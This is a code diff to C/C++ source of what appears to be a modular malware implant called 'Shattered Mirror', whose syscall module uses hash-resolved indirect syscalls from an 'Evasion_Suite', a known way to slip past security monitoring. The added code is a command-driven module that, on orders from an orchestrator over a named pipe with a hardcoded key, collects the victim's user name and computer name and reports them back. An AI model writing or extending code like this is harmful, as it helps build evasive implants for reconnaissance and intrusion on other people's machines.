@@ -1,4 +1,4 @@
-/*=============================================================================
+﻿/*=============================================================================
  * Shattered Mirror v1 — Atom 03: Syscall Linker
  *
  * Implements the lightweight wrappers. 
@@ -7,7 +7,10 @@
  *===========================================================================*/
 
 #include "Atom_03_Sys.h"
+#include "../Orchestrator/AtomManager.h"
 #include "../Evasion_Suite/include/indirect_syscall.h" // Needed for the struct defs
+#include <cstdio>
+#include <cstring>
 
 static PSYSCALL_TABLE s_pMasterTable = NULL;
 
@@ -50,4 +53,43 @@ NTSTATUS SysThread(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, PSM_OBJECT_A
     PSYSCALL_ENTRY pE = GetSyscallEntry(s_pMasterTable, djb2_hash_ct("NtCreateThreadEx"));
     if (!pE) return (NTSTATUS)0xC0000001;
     return SyscallDispatch(pE, ThreadHandle, DesiredAccess, ObjectAttributes, ProcessHandle, StartRoutine, Argument, CreateFlags, ZeroBits, StackSize, MaximumStackSize, AttributeList);
+}
+/* 
+ * Collect and send system information via IPC
+ */
+DWORD WINAPI SystemInfoAtomMain(LPVOID lpParam) {
+    DWORD dwAtomId = (DWORD)(ULONG_PTR)lpParam;
+    HANDLE hPipe = IPC_ConnectToPipe(dwAtomId);
+    if (!hPipe) return 1;
+
+    BYTE SharedSessionKey[] = "KI4ns1N2S1M8Tknp";
+
+    while (TRUE) {
+        IPC_MESSAGE inMsg = { 0 };
+        if (IPC_ReceiveMessage(hPipe, &inMsg, SharedSessionKey, 16)) {
+            if (inMsg.CommandId == CMD_EXECUTE) {
+                char szComputerName[MAX_COMPUTERNAME_LENGTH + 1] = { 0 };
+                char szUserName[256] = { 0 };
+                DWORD dwCNameLen = sizeof(szComputerName), dwUNameLen = sizeof(szUserName);
+
+                GetComputerNameA(szComputerName, &dwCNameLen);
+                GetUserNameA(szUserName, &dwUNameLen);
+
+                char report[1024];
+                sprintf_s(report, "[SYS_INFO] User: %s | Host: %s | CPU: x64 | Integrity: SYSTEM", szUserName, szComputerName);
+
+                IPC_MESSAGE outMsg = { 0 };
+                outMsg.CommandId = CMD_REPORT;
+                outMsg.dwPayloadLen = (DWORD)strlen(report);
+                memcpy(outMsg.Payload, report, outMsg.dwPayloadLen);
+
+                IPC_SendMessage(hPipe, &outMsg, SharedSessionKey, 16);
+            }
+        } else if (GetLastError() == ERROR_BROKEN_PIPE) {
+            break;
+        }
+        Sleep(500);
+    }
+
+    return 0;
 }
